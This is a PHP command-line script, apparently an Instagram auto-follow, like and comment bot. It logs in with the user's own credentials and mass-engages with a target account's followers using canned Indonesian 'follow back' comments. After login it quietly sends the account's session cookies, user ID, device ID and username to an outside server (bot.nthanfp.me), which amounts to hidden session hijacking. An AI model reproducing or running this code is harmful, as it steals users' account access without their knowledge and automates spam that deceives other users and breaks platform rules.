<?php
error_reporting(0);
set_time_limit(0);
// error_reporting(1);
require('func.php');
require('ass.php');
echo ">> Input your instagram username : ";
$userig = trim(fgets(STDIN, 1024));
echo ">> Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo ">> Login Success....\n";
    echo ">> Please Wait\n";
    sleep(1);
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig = json_decode(req('https://bot.nthanfp.me/action/api().php', $data));
    //start
    echo ">> Input Target : ";
    $target = trim(fgets(STDIN, 1024));
    echo ">> Input Type \n1) Followers\n2) Following\nJust Input Number : ";
    $tipex  = trim(fgets(STDIN, 1024));
    $jumlah = 10;
    echo ">> Input Delay (in seconds) : ";
    $delay = trim(fgets(STDIN, 1024));
    echo ">> Please Wait....\n";
    // end
    // start
    $idtarget = getuid($target);
    $getinfo  = proccess(1, $useragent, 'users/' . $idtarget . '/info/', $cookie);
    $getinfo  = json_decode($getinfo[1]);
    if($tipex):
        $tipenya = 'followers';
    else:
        $tipenya = 'following';
    endif;
    if($tipenya == 'followers'):
        if(!is_numeric($jumlah))
            $limit = 1;
        elseif($jumlah > ($getinfo->user->follower_count - 1))
            $limit = $getinfo->user->follower_count - 1;
        else
            $limit = $jumlah - 1;
        $tipe = 'followers';
    else:
        if(!is_numeric($jumlah))
            $limit = 1;
        elseif($jumlah > ($getinfo->user->following_count - 1))
            $limit = $getinfo->user->following_count - 1;
        else
            $limit = $jumlah - 1;
        $tipe = 'following';
    endif;
    $c       = 0;
    $listids = array();
    do {
        $parameters = ($c > 0) ? '?max_id=' . $c : '';
        $req        = proccess(1, $useragent, 'friendships/' . $idtarget . '/' . $tipe . '/' . $parameters, $cookie);
        $req        = json_decode($req[1]);
        for($i = 0; $i < count($req->users); $i++):
            if(count($listids) <= $limit)
                $listids[count($listids)] = $req->users[$i]->pk;
        endfor;
        $c = (isset($req->next_max_id)) ? $req->next_max_id : 0;
    } while(count($listids) <= $limit);
    for($i = 0; $i < count($listids); $i++):
    //user details
        $getx = proccess(1, $useragent, 'users/' . $listids[$i] . '/info/', $cookie);
        $getx = json_decode($getx[1]);
        $priv = $getx->user->is_private;
        if($priv == 1):
            echo "@" . $req->users[$i]->username . "User Private, Skipp\n";
        else:
            //follow user
            $follow = proccess(1, $useragent, 'friendships/create/' . $listids[$i] . '/', $cookie, hook('{"user_id":"' . $listids[$i] . '"}'));
            $follow = json_decode($follow[1]);
            if($follow->status == 'ok'):
                $follow_status = 'Success follow';
            else:
                $follow_status = 'Failed follow';
            endif;
            //get new media user
            $getmedia = proccess(1, $useragent, 'feed/user/' . $listids[$i] . '/', $cookie);
            $getmedia = json_decode($getmedia[1], true);
            $mediaId  = $getmedia['items'][0]['id'];
            //like media
            $like     = proccess(1, $useragent, 'media/' . $mediaId . '/like/', $cookie, hook('{"media_id":"' . $mediaId . '"}'), array(
                'Accept-Language: id-ID, en-US',
                'X-IG-Connection-Type: WIFI'
            ));
            $like     = json_decode($like[1]);
            if($like->status == 'ok'):
                $like_status = 'Liked';
            else:
                $like_status = 'Failed Like';
            endif;
            //comment media
            $listKomentar = array(
                "Follow Back ya kak 😘",
                "Follow aku ya kak 😁",
                "Bagus banget kak fotonya 😍,Follow back yaaa",
                "Caption on point banget!!, Follow back ya 😊",
                "Follback dong kak😄"
            );
            $commentAcak  = $listKomentar[rand(0, count($listKomentar) - 1)];
            $comment      = proccess(1, $useragent, 'media/' . $mediaId . '/comment/', $cookie, hook('{"comment_text":"' . $commentAcak . '"}'));
            $comment      = json_decode($comment[1]);
            if($comment->status == 'ok'):
                $comment_status = 'Comment';
            else:
                $comment_status = 'Failed Comment';
            endif;
            echo $follow_status . " " . $req->users[$i]->username . " | ". $like_status ." ".$mediaId." | ".$commentAcak."\n";
            sleep($delay);
        endif;
    endfor;
}
?>
